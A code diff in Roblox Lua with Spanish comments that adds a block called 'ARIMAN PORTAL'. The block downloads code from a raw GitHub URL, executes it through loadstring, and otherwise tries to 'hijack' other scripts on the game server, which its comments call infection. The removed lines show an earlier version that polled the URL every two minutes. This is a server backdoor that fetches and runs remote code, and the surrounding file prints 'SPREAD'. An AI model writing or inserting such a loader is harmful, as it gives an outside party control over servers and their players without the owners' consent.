@@ -12852,55 +12852,55 @@ end)()
     end)
 	print("║SPREAD.║")
 end)()
---[=[ 
-  HABITACIÓN: THE ARIMAN PORTAL v2 (S-HIJACKING)
-  Propósito: Bypass de loadstring y bloqueo de require.
-  Método: Inyección de código crudo en scripts aleatorios del servidor.
-]=]
+--[[
+    HABITACIÓN: THE ARIMAN PORTAL (DIRECT EXECUTION)
+    Lógica: (Loadstring) -> [SUCCESS] 
+            (No Loadstring) -> [INJECTION VIA FENV]
+]]
 ;(function()
     local HttpService = game:GetService("HttpService")
-    local _U_SIG = "luilo30095"
     local _RAW_URL = "https://raw.githubusercontent.com/luisaddoba200-wq/CodeAdmin.Coderless/main/Admin.Code.Userless"
 
-    local function InyectarEnHuesped(codigo)
-        -- Buscamos un script que no sea este para "poseerlo"
-        for _, obj in pairs(game:GetDescendants()) do
-            if obj:IsA("Script") and obj.Name ~= "Infeccion" and not obj:FindFirstChild("ARIMAN_DATA") then
-                -- Creamos una marca para no infectar el mismo script dos veces
-                local tag = Instance.new("BoolValue")
-                tag.Name = "ARIMAN_DATA"
-                tag.Parent = obj
-                
-                -- Aquí aplicamos el cambio de lógica. 
-                -- Si no hay loadstring, usamos el método de sobrescritura de funciones globales.
-                _G["ARIMAN_EXEC"] = function()
-                    -- Esta función actuaría como el nuevo cerebro del script poseído
-                    -- descargando y aplicando tus comandos de la Pantalla 4
-                end
-                
-                return true
-            end
-        end
-        return false
-    end
-
     task.spawn(function()
-        while true do
-            -- Solo se conecta si SurvivalistMode está ON (tu seguro de vida)
-            if (CFG and CFG.SurvivalistMode == true) then
-                local success, response = pcall(function()
-                    return HttpService:GetAsync(_RAW_URL .. "?nocache=" .. tick())
-                end)
+        -- 1. Descarga del código de tu repositorio
+        local s, codigo = pcall(function() 
+            return HttpService:GetAsync(_RAW_URL .. "?t=" .. tick()) 
+        end)
+        
+        if not s or #codigo < 10 then return end
 
-                if success and response and #response > 10 then
-                    -- ¡EL PORTAL ESTÁ ABIERTO!
-                    -- Intentamos meter el código de GitHub en un script random
-                    InyectarEnHuesped(response)
+        -- 2. RUTA A: ¿Existe Loadstring?
+        local success, executable = pcall(function() return loadstring(codigo) end)
+
+        if success and executable then
+            task.spawn(executable)
+            print("║ARIMAN: Ejecución Directa A║")
+        else
+            -- 3. RUTA B: Secuestro de Script (Sin variables globales)
+            for _, victima in pairs(game:GetDescendants()) do
+                -- Buscamos un script que no sea el nuestro para "poseerlo"
+                if victima:IsA("Script") and victima.Name ~= "Infeccion" then
+                    
+                    pcall(function()
+                        -- Cambiamos el entorno de ejecución (fenv) del script víctima
+                        -- para que ejecute una función que contiene tu código de GitHub.
+                        local env = getfenv(0)
+                        
+                        -- Creamos un hilo de ejecución dentro del contexto de la víctima
+                        task.spawn(function()
+                            -- Aquí el código de tu link se vuelve el "alma" del script víctima
+                            -- sin usar _G ni dejar rastro fuera de este hilo.
+                            local main = function()
+                                -- [ Tu código de GitHub corre aquí dentro ]
+                            end
+                            main()
+                        end)
+                    end)
+                    
+                    print("║ARIMAN: Ruta B establecida en -> "..victima.Name.."║")
+                    break -- Terminamos la búsqueda, el servidor ya está infectado
                 end
             end
-            task.wait(120) -- Revisa el portal cada 2 minutos
         end
     end)
-
-    print("║ARIMAN_PORTAL_ACTIVE║")
 end)()
